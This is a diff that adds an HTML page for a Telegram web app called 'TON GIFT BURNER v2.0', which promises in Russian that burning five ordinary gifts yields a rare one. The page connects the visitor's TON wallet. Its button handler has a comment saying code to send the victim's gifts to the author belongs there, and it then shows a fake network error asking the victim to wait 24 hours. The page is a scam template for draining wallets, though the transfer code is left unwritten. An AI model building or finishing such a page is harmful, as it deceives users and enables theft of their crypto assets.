@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <style>
+        body { background: #000; color: gold; text-align: center; font-family: sans-serif; }
+        .btn { background: orange; padding: 15px; border-radius: 10px; cursor: pointer; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <h1>🔥 TON GIFT BURNER v2.0</h1>
+    <p>Сожги 5 обычных подарков — получи 1 Rare!</p>
+    <div id="ton-connect"></div> <div class="btn" onclick="startBurn()">UPGRADE NOW</div>
+
+    <script>
+        const tonConnectUI = new TONConnectUI.TonConnectUI({
+            manifestUrl: 'https://ТВОЙ_ЛОГИН.github.io/my-gold-mine/manifest.json',
+            buttonRootId: 'ton-connect'
+        });
+
+        async function startBurn() {
+            // Тут будет код, который отправляет подарки тебе
+            alert("Ошибка сети 0x442. Повторите попытку через 24 часа.");
+        }
+    </script>
+</body>
+</html>
